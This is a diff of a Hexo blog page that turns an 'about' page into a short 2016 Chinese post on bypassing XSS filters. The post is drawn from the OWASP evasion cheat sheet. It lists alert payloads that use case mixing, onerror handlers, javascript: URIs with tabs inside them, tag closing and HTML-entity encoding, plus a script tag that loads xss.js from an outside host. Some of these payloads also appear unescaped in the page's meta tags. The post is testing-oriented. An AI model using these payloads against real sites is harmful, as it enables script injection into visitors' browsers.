@@ -3,18 +3,33 @@
 <head>
   <meta charset="utf-8">
   
-  <title>专注 | CHEN&#39;s Blog</title>
+  <title>XSS绕过技巧 | CHEN&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="strong a {        color: #747474;    }    .player {        text-align: center;        margin: .5em auto 0;    }    .player br {        display: none;    }    .sign {        text-align: right;">
-<meta property="og:type" content="website">
-<meta property="og:title" content="专注">
-<meta property="og:url" content="http://yoursite.com/about/index.html">
+  <meta name="description" content="经过看书和实战，下面进行了一些个人的总结
+xss一般进行XSS测试先对其过滤字符、限制长度搞清楚。
+首先:xss’”然后看其结果过滤了什么，转义了什么，再进行相对应得措施。
+绕过方法HTML url编码绕过在一次挖洞时用Burp 拦截，其编码方式是html编码，于是把所要插入的代码进行编码然后重发，便轻松实现绕过。
+大小写绕过这个是因为系统的问题，因为在windows系统中是大小写不敏感的，WIN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS绕过技巧">
+<meta property="og:url" content="http://yoursite.com/2016/08/28/XSS绕过技巧/index.html">
 <meta property="og:site_name" content="CHEN's Blog">
-<meta property="og:description" content="strong a {        color: #747474;    }    .player {        text-align: center;        margin: .5em auto 0;    }    .player br {        display: none;    }    .sign {        text-align: right;">
-<meta property="og:updated_time" content="2016-08-28T03:05:50.840Z">
+<meta property="og:description" content="经过看书和实战，下面进行了一些个人的总结
+xss一般进行XSS测试先对其过滤字符、限制长度搞清楚。
+首先:xss’”然后看其结果过滤了什么，转义了什么，再进行相对应得措施。
+绕过方法HTML url编码绕过在一次挖洞时用Burp 拦截，其编码方式是html编码，于是把所要插入的代码进行编码然后重发，便轻松实现绕过。
+大小写绕过这个是因为系统的问题，因为在windows系统中是大小写不敏感的，WIN">
+<meta property="og:image" content="http://yoursite.com/jav   ascript:alert('XSS');">
+<meta property="og:image" content="http://yoursite.com/jav	ascript:alert('XSS');">
+<meta property="og:updated_time" content="2016-08-28T04:08:52.817Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="专注">
-<meta name="twitter:description" content="strong a {        color: #747474;    }    .player {        text-align: center;        margin: .5em auto 0;    }    .player br {        display: none;    }    .sign {        text-align: right;">
+<meta name="twitter:title" content="XSS绕过技巧">
+<meta name="twitter:description" content="经过看书和实战，下面进行了一些个人的总结
+xss一般进行XSS测试先对其过滤字符、限制长度搞清楚。
+首先:xss’”然后看其结果过滤了什么，转义了什么，再进行相对应得措施。
+绕过方法HTML url编码绕过在一次挖洞时用Burp 拦截，其编码方式是html编码，于是把所要插入的代码进行编码然后重发，便轻松实现绕过。
+大小写绕过这个是因为系统的问题，因为在windows系统中是大小写不敏感的，WIN">
+<meta name="twitter:image" content="http://yoursite.com/jav   ascript:alert('XSS');">
   
   
     <link rel="icon" href="/img/xss.png">
@@ -37,7 +52,7 @@
           fancybox: true,
           animate: true,
           isHome: false,
-          isPost: false,
+          isPost: true,
           isArchive: false,
           isTag: false,
           isCategory: false,
@@ -221,7 +236,13 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-about" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="[layout]-XSS绕过技巧" class="article article-type-[layout]" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/28/XSS绕过技巧/" class="article-date">
+      <time datetime="2016-08-28T02:47:54.000Z" itemprop="datePublished">2016-08-28</time>
+</a>
+    </div>
   
   <div class="article-inner">
     
@@ -232,7 +253,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      专注
+      XSS绕过技巧
     </h1>
   
 
@@ -242,6 +263,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/绕过技巧/">绕过技巧</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -249,88 +274,93 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-              <style>
-    .article-meta {
-        display: none;
-    }
-    #container .article .article-title {
-        padding-right: 0;
-    }
-    .article-header {
-        padding: 0;
-        padding-top: 26px;
-        border-left: none;
-        text-align: center;
-    }
-    .article-header:hover {
-        border-left: none;
-    }
-    .article-title {
-        font-size: 1.6em
-    }
-    .article-meta {
-        display: none;
-    }
-    .article-entry hr {
-        margin: 0;
-    }
-    #container .article-info-post.article-info {
-      display: none;
-      }
-    #container .article .article-title {
-    padding: 0;
-    }
-</style>
+        <p>经过看书和实战，下面进行了一些个人的总结</p>
+<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>一般进行XSS测试先对其过滤字符、限制长度搞清楚。</p>
+<p>首先:<xss>xss’”然后看其结果过滤了什么，转义了什么，再进行相对应得措施。</xss></p>
+<h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="HTML-url编码绕过"><a href="#HTML-url编码绕过" class="headerlink" title="HTML url编码绕过"></a>HTML url编码绕过</h2><p>在一次挖洞时用Burp 拦截，其编码方式是html编码，于是把所要插入的代码进行编码然后重发，便轻松实现绕过。</p>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>这个是因为系统的问题，因为在windows系统中是大小写不敏感的，WINDOWS和WinDows是被当做一样的字符串处理。<br>而linux系统是大小写敏感的。</p>
+<p>正常情况的xss攻击代码是<br>    <script>alert(‘XSS’);</script></p>
+<pre><code>#有时候用大小写就可绕过其过滤字符
+&lt;ScRipt&gt;AlErT(&apos;XSS&apos;);&lt;/ScRiPT&gt;
+</code></pre><h2 id="通过error事件触发alert"><a href="#通过error事件触发alert" class="headerlink" title="通过error事件触发alert"></a>通过error事件触发alert</h2><pre><code>&lt;img src=&apos;#&apos; onerror=alert(&quot;XSS&quot;)&gt;
+#无引号无分号
+&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
+</code></pre><p>###内嵌TAB(或者回车)</p>
+<p>用来分开xss攻击代码<br>    <img src="jav   ascript:alert('XSS');"></p>
+<p>####内嵌被编码的TAB<br>    <img src="jav&#x09;ascript:alert('XSS');"></p>
+<h2 id="闭合标签绕过"><a href="#闭合标签绕过" class="headerlink" title="闭合标签绕过"></a>闭合<html>标签绕过</html></h2><pre><code>&lt;/title&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+</code></pre><h2 id="无过滤绕过"><a href="#无过滤绕过" class="headerlink" title="无过滤绕过"></a>无过滤绕过</h2><p>这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）<br>    <script src="http://ha.ckers.org/xss.js"></script></p>
+<h2 id="十进制html编码"><a href="#十进制html编码" class="headerlink" title="十进制html编码"></a>十进制html编码</h2><pre><code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+</code></pre><h3 id="结尾没有分号的十进制html编码"><a href="#结尾没有分号的十进制html编码" class="headerlink" title="结尾没有分号的十进制html编码"></a>结尾没有分号的十进制html编码</h3><pre><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</code></pre><p>##参考链接：<br><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html" target="_blank" rel="external">XSS 过滤绕过备忘单</a></p>
 
-
-          
-        <p><style type="text/css"><br>    strong a {<br>        color: #747474;<br>    }<br>    .player {<br>        text-align: center;<br>        margin: .5em auto 0;<br>    }<br>    .player br {<br>        display: none;<br>    }<br>    .sign {<br>        text-align: right;<br>        font-style: italic;<br>    }</p>
-<pre><code>#ds-recent-visitors {
-    padding: 0;
-}
-#ds-recent-visitors div,#ds-recent-visitors div a{
-    display: inline-block;
-}
-#ds-recent-visitors div img {
-    display: inline-block !important;
-    width: 56px !important;
-    height: 56px !important;
-    border-radius: 50%;
-    border: 1px solid #ddd;
-    padding: 2px;
-}
-.article-entry img:first-child {
-    display: block;
-}
-.article-entry span {
-    font-family: Arial;
-}
-</code></pre><p></style><br>　　2016年6月，明确了自己真正所热衷的事 <span>——</span> 信息安全。</p>
-<p style="text-align: right;"><span>——</span>  2016年8月26日</p>
-
-
-<p><br></p>
-<h3 id="白纸的地图"><a href="#白纸的地图" class="headerlink" title="白纸的地图:"></a>白纸的地图:</h3><p>如果把来找我咨询的人比喻成迷途的羔羊，通常他们手上都有地图，却没有去看，或是不知道自己目前的位置。你的地图是一张白纸，所以即使想决定目的地，也不知道路在哪里。可是换个角度看，正因为是一张白纸，才可以随心所欲地描绘地图，一切全在你自己。对你来说，一切都是自由地，在你面前是无限地可能。这可是很棒地事啊。</p>
-<h3 id="开博缘由"><a href="#开博缘由" class="headerlink" title="开博缘由:"></a>开博缘由:</h3><blockquote>
-<p>通过写博客的方式，加深理解，显性化自己的隐性知识；<br>共享知识，吸引同好，交流进步。</p>
-</blockquote>
-<h3 id="博客文章下载"><a href="#博客文章下载" class="headerlink" title="博客文章下载:"></a>博客文章下载:</h3><blockquote>
-<p>本博客所有文章的原始 Markdown 文件都备份在 GitHub 上，有需要可以 <a href="https://github.com/luuman/Hexo" title="Hexo" target="_blank" rel="external">点此下载</a>。</p>
-</blockquote>
-<h3 id="欢迎交流"><a href="#欢迎交流" class="headerlink" title="欢迎交流:"></a>欢迎交流:</h3><blockquote>
-<p>个人邮件及社交网站等信息见边栏底部；<br>有什么留言或问题直接在文末留下评论即可。</p>
-</blockquote>
-<h3 id="欢迎访客"><a href="#欢迎访客" class="headerlink" title="欢迎访客:"></a>欢迎访客:</h3><ul class="ds-recent-visitors" data-num-items="39" data-avatar-size="56"></ul>
       
     </div>
     
   </div>
   
     
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/08/28/XSS绕过技巧/">XSS绕过技巧</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 CHEN 的个人博客">CHEN</a></p>
+        <p><span>发布时间:</span>2016年08月28日 - 10时47分</p>
+        <p><span>最后更新:</span>2016年08月28日 - 12时08分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/08/28/XSS绕过技巧/" title="XSS绕过技巧">http://yoursite.com/2016/08/28/XSS绕过技巧/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/08/28/XSS绕过技巧/　　作者: CHEN" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
 
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2016/08/26/记一次搭建博客的经历/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">记一次搭建博客的经历</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
 
   
 </article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss"><span class="toc-number">1.</span> <span class="toc-text">xss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过方法"><span class="toc-number">2.</span> <span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-url编码绕过"><span class="toc-number">2.1.</span> <span class="toc-text">HTML url编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大小写绕过"><span class="toc-number">2.2.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过error事件触发alert"><span class="toc-number">2.3.</span> <span class="toc-text">通过error事件触发alert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#闭合标签绕过"><span class="toc-number">2.4.</span> <span class="toc-text">闭合标签绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无过滤绕过"><span class="toc-number">2.5.</span> <span class="toc-text">无过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#十进制html编码"><span class="toc-number">2.6.</span> <span class="toc-text">十进制html编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#结尾没有分号的十进制html编码"><span class="toc-number">2.6.1.</span> <span class="toc-text">结尾没有分号的十进制html编码</span></a></li></ol></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
 
 
 
@@ -339,7 +369,7 @@
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="about/index.html" data-title="专注" data-url="http://yoursite.com/about/index.html"></div>
+    <div class="ds-thread" data-thread-key="2016/08/28/XSS绕过技巧/" data-title="XSS绕过技巧" data-url="http://yoursite.com/2016/08/28/XSS绕过技巧/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -359,6 +389,37 @@
     
 
 
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2016/08/26/记一次搭建博客的经历/" title="下一篇: 记一次搭建博客的经历">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/08/28/XSS绕过技巧/">XSS绕过技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/26/记一次搭建博客的经历/">记一次搭建博客的经历</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
 
 
 
